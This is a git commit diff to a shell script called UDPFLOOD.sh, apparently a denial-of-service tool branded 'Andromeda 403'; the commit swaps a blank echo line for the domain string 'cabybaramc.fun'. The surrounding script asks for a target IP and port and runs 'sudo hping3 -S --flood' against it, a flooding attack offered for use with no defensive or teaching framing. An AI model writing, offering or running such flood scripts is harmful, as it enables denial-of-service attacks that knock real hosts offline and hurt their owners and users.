f0e17f7b1141fad61ebed12aaa80ff7098d26e25
quocbinhne99 <quocbinhdangngoc939@gmail.com>
2025-05-06 11:46:45 +0700

    Update UDPFLOOD.sh

--- UDPFLOOD.sh
+++ UDPFLOOD.sh
@@ -18,7 +18,7 @@ echo "UDP FLOOD by Andromeda 403 | 403 Forbidden"
 echo
 echo
 echo "Target IP:" && read ip
-echo
+echo cabybaramc.fun
 echo "Target Port:" && read port
 echo "SENDING ATTACK TO $ip in PORT $port | TO STOP: CTRL + C..."
 sudo hping3 -S --flood -V -p $port $ip
